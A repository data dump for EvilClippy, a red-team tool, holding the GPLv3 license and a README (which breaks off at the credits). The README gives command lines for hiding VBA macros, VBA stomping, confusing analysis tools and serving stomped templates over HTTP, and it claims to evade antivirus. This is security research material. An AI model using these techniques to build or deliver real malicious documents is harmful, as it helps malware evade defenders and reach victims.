{
  "metadata": {
    "timestamp": 1736710903346,
    "page": 497,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjUwMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "outflanknl/EvilClippy",
      "stars": 2137,
      "defaultBranch": "master",
      "files": [
        {
          "name": "LICENSE.md",
          "type": "blob",
          "size": 34.3251953125,
          "content": "                    GNU GENERAL PUBLIC LICENSE\n                       Version 3, 29 June 2007\n\n Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>\n Everyone is permitted to copy and distribute verbatim copies\n of this license document, but changing it is not allowed.\n\n                            Preamble\n\n  The GNU General Public License is a free, copyleft license for\nsoftware and other kinds of works.\n\n  The licenses for most software and other practical works are designed\nto take away your freedom to share and change the works.  By contrast,\nthe GNU General Public License is intended to guarantee your freedom to\nshare and change all versions of a program--to make sure it remains free\nsoftware for all its users.  We, the Free Software Foundation, use the\nGNU General Public License for most of our software; it applies also to\nany other work released this way by its authors.  You can apply it to\nyour programs, too.\n\n  When we speak of free software, we are referring to freedom, not\nprice.  Our General Public Licenses are designed to make sure that you\nhave the freedom to distribute copies of free software (and charge for\nthem if you wish), that you receive source code or can get it if you\nwant it, that you can change the software or use pieces of it in new\nfree programs, and that you know you can do these things.\n\n  To protect your rights, we need to prevent others from denying you\nthese rights or asking you to surrender the rights.  Therefore, you have\ncertain responsibilities if you distribute copies of the software, or if\nyou modify it: responsibilities to respect the freedom of others.\n\n  For example, if you distribute copies of such a program, whether\ngratis or for a fee, you must pass on to the recipients the same\nfreedoms that you received.  You must make sure that they, too, receive\nor can get the source code.  And you must show them these terms so they\nknow their rights.\n\n  Developers that use the GNU GPL protect your rights with two steps:\n(1) assert copyright on the software, and (2) offer you this License\ngiving you legal permission to copy, distribute and/or modify it.\n\n  For the developers' and authors' protection, the GPL clearly explains\nthat there is no warranty for this free software.  For both users' and\nauthors' sake, the GPL requires that modified versions be marked as\nchanged, so that their problems will not be attributed erroneously to\nauthors of previous versions.\n\n  Some devices are designed to deny users access to install or run\nmodified versions of the software inside them, although the manufacturer\ncan do so.  This is fundamentally incompatible with the aim of\nprotecting users' freedom to change the software.  The systematic\npattern of such abuse occurs in the area of products for individuals to\nuse, which is precisely where it is most unacceptable.  Therefore, we\nhave designed this version of the GPL to prohibit the practice for those\nproducts.  If such problems arise substantially in other domains, we\nstand ready to extend this provision to those domains in future versions\nof the GPL, as needed to protect the freedom of users.\n\n  Finally, every program is threatened constantly by software patents.\nStates should not allow patents to restrict development and use of\nsoftware on general-purpose computers, but in those that do, we wish to\navoid the special danger that patents applied to a free program could\nmake it effectively proprietary.  To prevent this, the GPL assures that\npatents cannot be used to render the program non-free.\n\n  The precise terms and conditions for copying, distribution and\nmodification follow.\n\n                       TERMS AND CONDITIONS\n\n  0. Definitions.\n\n  \"This License\" refers to version 3 of the GNU General Public License.\n\n  \"Copyright\" also means copyright-like laws that apply to other kinds of\nworks, such as semiconductor masks.\n\n  \"The Program\" refers to any copyrightable work licensed under this\nLicense.  Each licensee is addressed as \"you\".  \"Licensees\" and\n\"recipients\" may be individuals or organizations.\n\n  To \"modify\" a work means to copy from or adapt all or part of the work\nin a fashion requiring copyright permission, other than the making of an\nexact copy.  The resulting work is called a \"modified version\" of the\nearlier work or a work \"based on\" the earlier work.\n\n  A \"covered work\" means either the unmodified Program or a work based\non the Program.\n\n  To \"propagate\" a work means to do anything with it that, without\npermission, would make you directly or secondarily liable for\ninfringement under applicable copyright law, except executing it on a\ncomputer or modifying a private copy.  Propagation includes copying,\ndistribution (with or without modification), making available to the\npublic, and in some countries other activities as well.\n\n  To \"convey\" a work means any kind of propagation that enables other\nparties to make or receive copies.  Mere interaction with a user through\na computer network, with no transfer of a copy, is not conveying.\n\n  An interactive user interface displays \"Appropriate Legal Notices\"\nto the extent that it includes a convenient and prominently visible\nfeature that (1) displays an appropriate copyright notice, and (2)\ntells the user that there is no warranty for the work (except to the\nextent that warranties are provided), that licensees may convey the\nwork under this License, and how to view a copy of this License.  If\nthe interface presents a list of user commands or options, such as a\nmenu, a prominent item in the list meets this criterion.\n\n  1. Source Code.\n\n  The \"source code\" for a work means the preferred form of the work\nfor making modifications to it.  \"Object code\" means any non-source\nform of a work.\n\n  A \"Standard Interface\" means an interface that either is an official\nstandard defined by a recognized standards body, or, in the case of\ninterfaces specified for a particular programming language, one that\nis widely used among developers working in that language.\n\n  The \"System Libraries\" of an executable work include anything, other\nthan the work as a whole, that (a) is included in the normal form of\npackaging a Major Component, but which is not part of that Major\nComponent, and (b) serves only to enable use of the work with that\nMajor Component, or to implement a Standard Interface for which an\nimplementation is available to the public in source code form.  A\n\"Major Component\", in this context, means a major essential component\n(kernel, window system, and so on) of the specific operating system\n(if any) on which the executable work runs, or a compiler used to\nproduce the work, or an object code interpreter used to run it.\n\n  The \"Corresponding Source\" for a work in object code form means all\nthe source code needed to generate, install, and (for an executable\nwork) run the object code and to modify the work, including scripts to\ncontrol those activities.  However, it does not include the work's\nSystem Libraries, or general-purpose tools or generally available free\nprograms which are used unmodified in performing those activities but\nwhich are not part of the work.  For example, Corresponding Source\nincludes interface definition files associated with source files for\nthe work, and the source code for shared libraries and dynamically\nlinked subprograms that the work is specifically designed to require,\nsuch as by intimate data communication or control flow between those\nsubprograms and other parts of the work.\n\n  The Corresponding Source need not include anything that users\ncan regenerate automatically from other parts of the Corresponding\nSource.\n\n  The Corresponding Source for a work in source code form is that\nsame work.\n\n  2. Basic Permissions.\n\n  All rights granted under this License are granted for the term of\ncopyright on the Program, and are irrevocable provided the stated\nconditions are met.  This License explicitly affirms your unlimited\npermission to run the unmodified Program.  The output from running a\ncovered work is covered by this License only if the output, given its\ncontent, constitutes a covered work.  This License acknowledges your\nrights of fair use or other equivalent, as provided by copyright law.\n\n  You may make, run and propagate covered works that you do not\nconvey, without conditions so long as your license otherwise remains\nin force.  You may convey covered works to others for the sole purpose\nof having them make modifications exclusively for you, or provide you\nwith facilities for running those works, provided that you comply with\nthe terms of this License in conveying all material for which you do\nnot control copyright.  Those thus making or running the covered works\nfor you must do so exclusively on your behalf, under your direction\nand control, on terms that prohibit them from making any copies of\nyour copyrighted material outside their relationship with you.\n\n  Conveying under any other circumstances is permitted solely under\nthe conditions stated below.  Sublicensing is not allowed; section 10\nmakes it unnecessary.\n\n  3. Protecting Users' Legal Rights From Anti-Circumvention Law.\n\n  No covered work shall be deemed part of an effective technological\nmeasure under any applicable law fulfilling obligations under article\n11 of the WIPO copyright treaty adopted on 20 December 1996, or\nsimilar laws prohibiting or restricting circumvention of such\nmeasures.\n\n  When you convey a covered work, you waive any legal power to forbid\ncircumvention of technological measures to the extent such circumvention\nis effected by exercising rights under this License with respect to\nthe covered work, and you disclaim any intention to limit operation or\nmodification of the work as a means of enforcing, against the work's\nusers, your or third parties' legal rights to forbid circumvention of\ntechnological measures.\n\n  4. Conveying Verbatim Copies.\n\n  You may convey verbatim copies of the Program's source code as you\nreceive it, in any medium, provided that you conspicuously and\nappropriately publish on each copy an appropriate copyright notice;\nkeep intact all notices stating that this License and any\nnon-permissive terms added in accord with section 7 apply to the code;\nkeep intact all notices of the absence of any warranty; and give all\nrecipients a copy of this License along with the Program.\n\n  You may charge any price or no price for each copy that you convey,\nand you may offer support or warranty protection for a fee.\n\n  5. Conveying Modified Source Versions.\n\n  You may convey a work based on the Program, or the modifications to\nproduce it from the Program, in the form of source code under the\nterms of section 4, provided that you also meet all of these conditions:\n\n    a) The work must carry prominent notices stating that you modified\n    it, and giving a relevant date.\n\n    b) The work must carry prominent notices stating that it is\n    released under this License and any conditions added under section\n    7.  This requirement modifies the requirement in section 4 to\n    \"keep intact all notices\".\n\n    c) You must license the entire work, as a whole, under this\n    License to anyone who comes into possession of a copy.  This\n    License will therefore apply, along with any applicable section 7\n    additional terms, to the whole of the work, and all its parts,\n    regardless of how they are packaged.  This License gives no\n    permission to license the work in any other way, but it does not\n    invalidate such permission if you have separately received it.\n\n    d) If the work has interactive user interfaces, each must display\n    Appropriate Legal Notices; however, if the Program has interactive\n    interfaces that do not display Appropriate Legal Notices, your\n    work need not make them do so.\n\n  A compilation of a covered work with other separate and independent\nworks, which are not by their nature extensions of the covered work,\nand which are not combined with it such as to form a larger program,\nin or on a volume of a storage or distribution medium, is called an\n\"aggregate\" if the compilation and its resulting copyright are not\nused to limit the access or legal rights of the compilation's users\nbeyond what the individual works permit.  Inclusion of a covered work\nin an aggregate does not cause this License to apply to the other\nparts of the aggregate.\n\n  6. Conveying Non-Source Forms.\n\n  You may convey a covered work in object code form under the terms\nof sections 4 and 5, provided that you also convey the\nmachine-readable Corresponding Source under the terms of this License,\nin one of these ways:\n\n    a) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by the\n    Corresponding Source fixed on a durable physical medium\n    customarily used for software interchange.\n\n    b) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by a\n    written offer, valid for at least three years and valid for as\n    long as you offer spare parts or customer support for that product\n    model, to give anyone who possesses the object code either (1) a\n    copy of the Corresponding Source for all the software in the\n    product that is covered by this License, on a durable physical\n    medium customarily used for software interchange, for a price no\n    more than your reasonable cost of physically performing this\n    conveying of source, or (2) access to copy the\n    Corresponding Source from a network server at no charge.\n\n    c) Convey individual copies of the object code with a copy of the\n    written offer to provide the Corresponding Source.  This\n    alternative is allowed only occasionally and noncommercially, and\n    only if you received the object code with such an offer, in accord\n    with subsection 6b.\n\n    d) Convey the object code by offering access from a designated\n    place (gratis or for a charge), and offer equivalent access to the\n    Corresponding Source in the same way through the same place at no\n    further charge.  You need not require recipients to copy the\n    Corresponding Source along with the object code.  If the place to\n    copy the object code is a network server, the Corresponding Source\n    may be on a different server (operated by you or a third party)\n    that supports equivalent copying facilities, provided you maintain\n    clear directions next to the object code saying where to find the\n    Corresponding Source.  Regardless of what server hosts the\n    Corresponding Source, you remain obligated to ensure that it is\n    available for as long as needed to satisfy these requirements.\n\n    e) Convey the object code using peer-to-peer transmission, provided\n    you inform other peers where the object code and Corresponding\n    Source of the work are being offered to the general public at no\n    charge under subsection 6d.\n\n  A separable portion of the object code, whose source code is excluded\nfrom the Corresponding Source as a System Library, need not be\nincluded in conveying the object code work.\n\n  A \"User Product\" is either (1) a \"consumer product\", which means any\ntangible personal property which is normally used for personal, family,\nor household purposes, or (2) anything designed or sold for incorporation\ninto a dwelling.  In determining whether a product is a consumer product,\ndoubtful cases shall be resolved in favor of coverage.  For a particular\nproduct received by a particular user, \"normally used\" refers to a\ntypical or common use of that class of product, regardless of the status\nof the particular user or of the way in which the particular user\nactually uses, or expects or is expected to use, the product.  A product\nis a consumer product regardless of whether the product has substantial\ncommercial, industrial or non-consumer uses, unless such uses represent\nthe only significant mode of use of the product.\n\n  \"Installation Information\" for a User Product means any methods,\nprocedures, authorization keys, or other information required to install\nand execute modified versions of a covered work in that User Product from\na modified version of its Corresponding Source.  The information must\nsuffice to ensure that the continued functioning of the modified object\ncode is in no case prevented or interfered with solely because\nmodification has been made.\n\n  If you convey an object code work under this section in, or with, or\nspecifically for use in, a User Product, and the conveying occurs as\npart of a transaction in which the right of possession and use of the\nUser Product is transferred to the recipient in perpetuity or for a\nfixed term (regardless of how the transaction is characterized), the\nCorresponding Source conveyed under this section must be accompanied\nby the Installation Information.  But this requirement does not apply\nif neither you nor any third party retains the ability to install\nmodified object code on the User Product (for example, the work has\nbeen installed in ROM).\n\n  The requirement to provide Installation Information does not include a\nrequirement to continue to provide support service, warranty, or updates\nfor a work that has been modified or installed by the recipient, or for\nthe User Product in which it has been modified or installed.  Access to a\nnetwork may be denied when the modification itself materially and\nadversely affects the operation of the network or violates the rules and\nprotocols for communication across the network.\n\n  Corresponding Source conveyed, and Installation Information provided,\nin accord with this section must be in a format that is publicly\ndocumented (and with an implementation available to the public in\nsource code form), and must require no special password or key for\nunpacking, reading or copying.\n\n  7. Additional Terms.\n\n  \"Additional permissions\" are terms that supplement the terms of this\nLicense by making exceptions from one or more of its conditions.\nAdditional permissions that are applicable to the entire Program shall\nbe treated as though they were included in this License, to the extent\nthat they are valid under applicable law.  If additional permissions\napply only to part of the Program, that part may be used separately\nunder those permissions, but the entire Program remains governed by\nthis License without regard to the additional permissions.\n\n  When you convey a copy of a covered work, you may at your option\nremove any additional permissions from that copy, or from any part of\nit.  (Additional permissions may be written to require their own\nremoval in certain cases when you modify the work.)  You may place\nadditional permissions on material, added by you to a covered work,\nfor which you have or can give appropriate copyright permission.\n\n  Notwithstanding any other provision of this License, for material you\nadd to a covered work, you may (if authorized by the copyright holders of\nthat material) supplement the terms of this License with terms:\n\n    a) Disclaiming warranty or limiting liability differently from the\n    terms of sections 15 and 16 of this License; or\n\n    b) Requiring preservation of specified reasonable legal notices or\n    author attributions in that material or in the Appropriate Legal\n    Notices displayed by works containing it; or\n\n    c) Prohibiting misrepresentation of the origin of that material, or\n    requiring that modified versions of such material be marked in\n    reasonable ways as different from the original version; or\n\n    d) Limiting the use for publicity purposes of names of licensors or\n    authors of the material; or\n\n    e) Declining to grant rights under trademark law for use of some\n    trade names, trademarks, or service marks; or\n\n    f) Requiring indemnification of licensors and authors of that\n    material by anyone who conveys the material (or modified versions of\n    it) with contractual assumptions of liability to the recipient, for\n    any liability that these contractual assumptions directly impose on\n    those licensors and authors.\n\n  All other non-permissive additional terms are considered \"further\nrestrictions\" within the meaning of section 10.  If the Program as you\nreceived it, or any part of it, contains a notice stating that it is\ngoverned by this License along with a term that is a further\nrestriction, you may remove that term.  If a license document contains\na further restriction but permits relicensing or conveying under this\nLicense, you may add to a covered work material governed by the terms\nof that license document, provided that the further restriction does\nnot survive such relicensing or conveying.\n\n  If you add terms to a covered work in accord with this section, you\nmust place, in the relevant source files, a statement of the\nadditional terms that apply to those files, or a notice indicating\nwhere to find the applicable terms.\n\n  Additional terms, permissive or non-permissive, may be stated in the\nform of a separately written license, or stated as exceptions;\nthe above requirements apply either way.\n\n  8. Termination.\n\n  You may not propagate or modify a covered work except as expressly\nprovided under this License.  Any attempt otherwise to propagate or\nmodify it is void, and will automatically terminate your rights under\nthis License (including any patent licenses granted under the third\nparagraph of section 11).\n\n  However, if you cease all violation of this License, then your\nlicense from a particular copyright holder is reinstated (a)\nprovisionally, unless and until the copyright holder explicitly and\nfinally terminates your license, and (b) permanently, if the copyright\nholder fails to notify you of the violation by some reasonable means\nprior to 60 days after the cessation.\n\n  Moreover, your license from a particular copyright holder is\nreinstated permanently if the copyright holder notifies you of the\nviolation by some reasonable means, this is the first time you have\nreceived notice of violation of this License (for any work) from that\ncopyright holder, and you cure the violation prior to 30 days after\nyour receipt of the notice.\n\n  Termination of your rights under this section does not terminate the\nlicenses of parties who have received copies or rights from you under\nthis License.  If your rights have been terminated and not permanently\nreinstated, you do not qualify to receive new licenses for the same\nmaterial under section 10.\n\n  9. Acceptance Not Required for Having Copies.\n\n  You are not required to accept this License in order to receive or\nrun a copy of the Program.  Ancillary propagation of a covered work\noccurring solely as a consequence of using peer-to-peer transmission\nto receive a copy likewise does not require acceptance.  However,\nnothing other than this License grants you permission to propagate or\nmodify any covered work.  These actions infringe copyright if you do\nnot accept this License.  Therefore, by modifying or propagating a\ncovered work, you indicate your acceptance of this License to do so.\n\n  10. Automatic Licensing of Downstream Recipients.\n\n  Each time you convey a covered work, the recipient automatically\nreceives a license from the original licensors, to run, modify and\npropagate that work, subject to this License.  You are not responsible\nfor enforcing compliance by third parties with this License.\n\n  An \"entity transaction\" is a transaction transferring control of an\norganization, or substantially all assets of one, or subdividing an\norganization, or merging organizations.  If propagation of a covered\nwork results from an entity transaction, each party to that\ntransaction who receives a copy of the work also receives whatever\nlicenses to the work the party's predecessor in interest had or could\ngive under the previous paragraph, plus a right to possession of the\nCorresponding Source of the work from the predecessor in interest, if\nthe predecessor has it or can get it with reasonable efforts.\n\n  You may not impose any further restrictions on the exercise of the\nrights granted or affirmed under this License.  For example, you may\nnot impose a license fee, royalty, or other charge for exercise of\nrights granted under this License, and you may not initiate litigation\n(including a cross-claim or counterclaim in a lawsuit) alleging that\nany patent claim is infringed by making, using, selling, offering for\nsale, or importing the Program or any portion of it.\n\n  11. Patents.\n\n  A \"contributor\" is a copyright holder who authorizes use under this\nLicense of the Program or a work on which the Program is based.  The\nwork thus licensed is called the contributor's \"contributor version\".\n\n  A contributor's \"essential patent claims\" are all patent claims\nowned or controlled by the contributor, whether already acquired or\nhereafter acquired, that would be infringed by some manner, permitted\nby this License, of making, using, or selling its contributor version,\nbut do not include claims that would be infringed only as a\nconsequence of further modification of the contributor version.  For\npurposes of this definition, \"control\" includes the right to grant\npatent sublicenses in a manner consistent with the requirements of\nthis License.\n\n  Each contributor grants you a non-exclusive, worldwide, royalty-free\npatent license under the contributor's essential patent claims, to\nmake, use, sell, offer for sale, import and otherwise run, modify and\npropagate the contents of its contributor version.\n\n  In the following three paragraphs, a \"patent license\" is any express\nagreement or commitment, however denominated, not to enforce a patent\n(such as an express permission to practice a patent or covenant not to\nsue for patent infringement).  To \"grant\" such a patent license to a\nparty means to make such an agreement or commitment not to enforce a\npatent against the party.\n\n  If you convey a covered work, knowingly relying on a patent license,\nand the Corresponding Source of the work is not available for anyone\nto copy, free of charge and under the terms of this License, through a\npublicly available network server or other readily accessible means,\nthen you must either (1) cause the Corresponding Source to be so\navailable, or (2) arrange to deprive yourself of the benefit of the\npatent license for this particular work, or (3) arrange, in a manner\nconsistent with the requirements of this License, to extend the patent\nlicense to downstream recipients.  \"Knowingly relying\" means you have\nactual knowledge that, but for the patent license, your conveying the\ncovered work in a country, or your recipient's use of the covered work\nin a country, would infringe one or more identifiable patents in that\ncountry that you have reason to believe are valid.\n\n  If, pursuant to or in connection with a single transaction or\narrangement, you convey, or propagate by procuring conveyance of, a\ncovered work, and grant a patent license to some of the parties\nreceiving the covered work authorizing them to use, propagate, modify\nor convey a specific copy of the covered work, then the patent license\nyou grant is automatically extended to all recipients of the covered\nwork and works based on it.\n\n  A patent license is \"discriminatory\" if it does not include within\nthe scope of its coverage, prohibits the exercise of, or is\nconditioned on the non-exercise of one or more of the rights that are\nspecifically granted under this License.  You may not convey a covered\nwork if you are a party to an arrangement with a third party that is\nin the business of distributing software, under which you make payment\nto the third party based on the extent of your activity of conveying\nthe work, and under which the third party grants, to any of the\nparties who would receive the covered work from you, a discriminatory\npatent license (a) in connection with copies of the covered work\nconveyed by you (or copies made from those copies), or (b) primarily\nfor and in connection with specific products or compilations that\ncontain the covered work, unless you entered into that arrangement,\nor that patent license was granted, prior to 28 March 2007.\n\n  Nothing in this License shall be construed as excluding or limiting\nany implied license or other defenses to infringement that may\notherwise be available to you under applicable patent law.\n\n  12. No Surrender of Others' Freedom.\n\n  If conditions are imposed on you (whether by court order, agreement or\notherwise) that contradict the conditions of this License, they do not\nexcuse you from the conditions of this License.  If you cannot convey a\ncovered work so as to satisfy simultaneously your obligations under this\nLicense and any other pertinent obligations, then as a consequence you may\nnot convey it at all.  For example, if you agree to terms that obligate you\nto collect a royalty for further conveying from those to whom you convey\nthe Program, the only way you could satisfy both those terms and this\nLicense would be to refrain entirely from conveying the Program.\n\n  13. Use with the GNU Affero General Public License.\n\n  Notwithstanding any other provision of this License, you have\npermission to link or combine any covered work with a work licensed\nunder version 3 of the GNU Affero General Public License into a single\ncombined work, and to convey the resulting work.  The terms of this\nLicense will continue to apply to the part which is the covered work,\nbut the special requirements of the GNU Affero General Public License,\nsection 13, concerning interaction through a network will apply to the\ncombination as such.\n\n  14. Revised Versions of this License.\n\n  The Free Software Foundation may publish revised and/or new versions of\nthe GNU General Public License from time to time.  Such new versions will\nbe similar in spirit to the present version, but may differ in detail to\naddress new problems or concerns.\n\n  Each version is given a distinguishing version number.  If the\nProgram specifies that a certain numbered version of the GNU General\nPublic License \"or any later version\" applies to it, you have the\noption of following the terms and conditions either of that numbered\nversion or of any later version published by the Free Software\nFoundation.  If the Program does not specify a version number of the\nGNU General Public License, you may choose any version ever published\nby the Free Software Foundation.\n\n  If the Program specifies that a proxy can decide which future\nversions of the GNU General Public License can be used, that proxy's\npublic statement of acceptance of a version permanently authorizes you\nto choose that version for the Program.\n\n  Later license versions may give you additional or different\npermissions.  However, no additional obligations are imposed on any\nauthor or copyright holder as a result of your choosing to follow a\nlater version.\n\n  15. Disclaimer of Warranty.\n\n  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY\nAPPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT\nHOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM \"AS IS\" WITHOUT WARRANTY\nOF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,\nTHE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\nPURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM\nIS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF\nALL NECESSARY SERVICING, REPAIR OR CORRECTION.\n\n  16. Limitation of Liability.\n\n  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING\nWILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS\nTHE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY\nGENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE\nUSE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF\nDATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD\nPARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),\nEVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF\nSUCH DAMAGES.\n\n  17. Interpretation of Sections 15 and 16.\n\n  If the disclaimer of warranty and limitation of liability provided\nabove cannot be given local legal effect according to their terms,\nreviewing courts shall apply local law that most closely approximates\nan absolute waiver of all civil liability in connection with the\nProgram, unless a warranty or assumption of liability accompanies a\ncopy of the Program in return for a fee.\n\n                     END OF TERMS AND CONDITIONS\n\n            How to Apply These Terms to Your New Programs\n\n  If you develop a new program, and you want it to be of the greatest\npossible use to the public, the best way to achieve this is to make it\nfree software which everyone can redistribute and change under these terms.\n\n  To do so, attach the following notices to the program.  It is safest\nto attach them to the start of each source file to most effectively\nstate the exclusion of warranty; and each file should have at least\nthe \"copyright\" line and a pointer to where the full notice is found.\n\n    <one line to give the program's name and a brief idea of what it does.>\n    Copyright (C) <year>  <name of author>\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program.  If not, see <https://www.gnu.org/licenses/>.\n\nAlso add information on how to contact you by electronic and paper mail.\n\n  If the program does terminal interaction, make it output a short\nnotice like this when it starts in an interactive mode:\n\n    <program>  Copyright (C) <year>  <name of author>\n    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.\n    This is free software, and you are welcome to redistribute it\n    under certain conditions; type `show c' for details.\n\nThe hypothetical commands `show w' and `show c' should show the appropriate\nparts of the General Public License.  Of course, your program's commands\nmight be different; for a GUI interface, you would use an \"about box\".\n\n  You should also get your employer (if you work as a programmer) or school,\nif any, to sign a \"copyright disclaimer\" for the program, if necessary.\nFor more information on this, and how to apply and follow the GNU GPL, see\n<https://www.gnu.org/licenses/>.\n\n  The GNU General Public License does not permit incorporating your program\ninto proprietary programs.  If your program is a subroutine library, you\nmay consider it more useful to permit linking proprietary applications with\nthe library.  If this is what you want to do, use the GNU Lesser General\nPublic License instead of this License.  But first, please read\n<https://www.gnu.org/licenses/why-not-lgpl.html>.\n"
        },
        {
          "name": "OpenMcdf.dll",
          "type": "blob",
          "size": 59.5,
          "content": null
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 6.2783203125,
          "content": "This tool was released during our BlackHat Asia talk (March 28, 2019). A video recording of this talk is available at https://www.youtube.com/watch?v=9ULzZA70Dzg.\n\n# Evil Clippy\nA cross-platform assistant for creating malicious MS Office documents. Can hide VBA macros, stomp VBA code (via P-Code) and confuse macro analysis tools. Runs on Linux, OSX and Windows.\n\nIf you're new to this tool, you might want to start by reading our blog post on Evil Clippy:\nhttps://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/\n\nThis project should be used for authorized testing or educational purposes only.\n\n## Current features\n* Hide VBA macros from the GUI editor\n* VBA stomping (P-code abuse)\n* Fool analyst tools\n* Serve VBA stomped templates via HTTP\n* Set/Remove VBA Project Locked/Unviewable Protection\n\nIf you have no idea what all of this is, check out the following resources first:\n* [Our MS Office Magic Show presentation at Derbycon 2018](https://outflank.nl/blog/2018/10/28/recordings-of-our-derbycon-and-brucon-presentations/)\n* [VBA stomping resources by the Walmart security team](https://vbastomp.com/)\n* [Pcodedmp by Dr. Bontchev](https://github.com/bontchev/pcodedmp)\n\n## How effective is this?\nAt the time of writing, this tool is capable of getting a default Cobalt Strike macro to bypass most major antivirus products and various maldoc analysis tools (by using VBA stomping in combination with random module names).\n\n## Technology\nEvil Clippy uses the [OpenMCDF library](https://github.com/ironfede/openmcdf/) to manipulate MS Office Compound File Binary Format (CFBF) files, and hereto abuses [MS-OVBA specifications](https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/) and features. It reuses code from [Kavod.VBA.Compression](https://github.com/rossknudsen/Kavod.Vba.Compression) to implement the compression algorithm that is used in dir and module streams (see MS-OVBA for relevant specifications).\n\nEvil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows.\n\n## Compilation\n\nWe do not provide a binary release for EvilClippy. Please compile executables yourself:\n\n**OSX and Linux**\n\nMake sure you have Mono installed. Then execute the following command from the command line:\n\n`mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs`\n\nNow run Evil Clippy from the command line:\n\n`mono EvilClippy.exe -h`\n\n**Windows**\n\nMake sure you have Visual Studio installed. Then execute the following command from a Visual Studio developer command prompt:\n\n`csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs`\n\nNow run Evil Clippy from the command line:\n\n`EvilClippy.exe -h`\n\n## Usage examples\n\n**Print help**\n\n`EvilClippy.exe -h`\n\n**Hide/Unhide macros from GUI**\n\nHide all macro modules (except the default \"ThisDocument\" module) from the VBA GUI editor. This is achieved by removing module lines from the project stream [MS-OVBA 2.3.1].\n\n`EvilClippy.exe -g macrofile.doc`\n\nUndo the changes done by the hide option (-g) so that we can debug the macro in the VBA IDE.\n\n`EvilClippy.exe -gg macrofile.doc`\n\n**Stomp VBA (abuse P-code)**\n\nPut fake VBA code from text file *fakecode.vba* in all modules, while leaving P-code intact. This abuses an undocumented feature of module streams [MS-OVBA 2.3.4.3]. Note that the VBA project version must match the host program in order for the P-code to be executed (see next example for version matching).\n\n`EvilClippy.exe -s fakecode.vba macrofile.doc`\n\nNote: VBA Stomping does not work for files saved in the Excel 97-2003 Workbook (.xls) format\n\n**Set target Office version for VBA stomping**\n\nSame as the above, but now explicitly targeting Word 2016 on x86. This means that Word 2016 on x86 will execute the P-code, while other versions of Word wil execute the code from *fakecode.vba* instead. Achieved by setting the appropriate version bytes in the _VBA_PROJECT stream [MS-OVBA 2.3.4.1].\n\n`EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc`\n\n**Set/reset random module names (fool analyst tools)**\n\nSet random ASCII module names in the dir stream [MS-OVBA 2.3.4.2]. This abuses ambiguity in the MODULESTREAMNAME records [MS-OVBA 2.3.4.2.3.2.3] - most analyst tools use the ASCII module names specified here, while MS Office used the Unicode variant. By setting a random ASCII module name most P-code and VBA analysis tools crash, while the actual P-code and VBA still runs fine in Word and Excel.\n\n`EvilClippy.exe -r macrofile.doc`\n\nNote: this is known to be effective in tricking pcodedmp and VirusTotal\n\nSet ASCII module names in the dir stream to match their Unicode counterparts. This reverses the changes made using the (-r) optoin of EvilClippy\n\n`EvilClippy.exe -rr macrofile.doc`\n\n**Serve a VBA stomped template via HTTP**\n\nService *macrofile.dot* via HTTP port 8080 after performing VBA stomping. If this file is retrieved, it automatically matches the target's Office version (using its HTTP headers and then setting the _VBA_PROJECT bytes accordingly).\n\n`EvilClippy.exe -s fakecode.vba -w 8080 macrofile.dot`\n\nNote: The file you are serving must be a template (.dot instead of .doc). You can set a template via a URL (.dot extension is not required!) from the developer toolbar in Word. Also, fakecode.vba must have a VB_Base attribute set for a macro from a template (this means that your fakecode.vba must start with a line such as *Attribute VB_Base = \"0{00020906-0000-0000-C000-000000000046}\"*).\n\n**Set/Remove VBA Project Locked/Unviewable Protection**\n\nTo set the Locked/Unviewable attributes use the '-u' option:\n\n`EvilClippy.exe -u macrofile.doc`\n\nTo remove the Locked/Unviewable attributes use the '-uu' option:\n\n`EvilClippy.exe -uu macrofile.doc`\n\nNote: You can remove the Locked/Unviewable attributes on files that were not locked with EvilClippy as well.\n\n## Limitations\n\nDeveloped for Microsoft Word and Excel document manipulation.\n\nAs noted above, VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format.\n\n## Authors\nStan Hegt ([@StanHacked](https://twitter.com/StanHacked)) / [Outflank](https://www.outflank.nl)\n\nWith significant 